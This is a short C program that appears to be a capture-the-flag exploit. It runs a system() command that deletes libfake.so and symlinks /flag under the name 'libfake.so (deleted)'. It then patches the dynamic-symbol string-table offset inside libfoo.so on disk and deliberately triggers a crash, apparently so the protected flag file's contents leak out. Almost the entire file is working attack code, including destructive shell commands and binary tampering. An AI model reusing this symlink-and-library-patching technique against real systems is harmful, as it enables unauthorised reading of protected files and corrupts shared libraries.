#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include "lib.h"
#include <unistd.h>

char data[0x10000];

void *thread_proc2(void* x)
{
    super_long_funtion_name_not_sure_if_length_matters_probably_yes(0);
}

int main() {
    system("rm ./libfake.so && ln -sf /flag 'libfake.so (deleted)'");

    pthread_t t;
    pthread_create(&t, NULL, thread_proc2, NULL);

    sleep(1);

    FILE *f = fopen("./libfoo.so", "r+");
    int s = fread(data, 1, 0x10000, f);
    data[0x390] = 0x58; // patch dynsym strtab offset
    data[0x391] = 0x3c;
    data[0x392] = 0;
    data[0x393] = 0;

    rewind(f);
    fwrite(data, 1, s, f);
    fclose(f);
    
    // crash
    looper(1);
    return 0;
}
